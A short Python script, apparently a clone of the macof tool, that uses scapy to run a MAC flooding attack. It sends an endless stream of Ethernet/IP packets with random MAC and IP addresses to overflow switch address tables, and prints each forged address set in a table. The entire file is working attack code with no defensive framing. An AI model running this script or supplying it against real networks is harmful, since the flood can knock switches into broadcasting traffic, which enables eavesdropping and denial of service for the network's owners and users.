import scapy.all as scapy
import random
from time import sleep
from rich.console import Console
from rich.table import Table

console = Console()

def generate_random_ip():
    octets = [str(random.randint(1, 254)) for _ in range(4)]
    return '.'.join(octets)

def random_mac_creator():
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    return ':'.join(f'{x:02x}' for x in mac)

def macof_attack():
    table = Table(title="MAC Flooding Attack")
    table.add_column("Source MAC", style="cyan")
    table.add_column("Source IP", style="green")
    table.add_column("Destination MAC", style="magenta")
    table.add_column("Destination IP", style="yellow")

    while True:
        src_macs = random_mac_creator()
        dst_macs = random_mac_creator()
        src_ip = generate_random_ip()
        dst_ip = generate_random_ip()

        table.add_row(src_macs, src_ip, dst_macs, dst_ip)
        console.print(table)

        mac_info = scapy.Ether(dst=dst_macs, src=src_macs)
        ip_info = scapy.IP(src=src_ip, dst=dst_ip)
        pkt = mac_info / ip_info
        scapy.sendp(pkt, verbose=False)
        

if __name__ == "__main__":
    macof_attack()
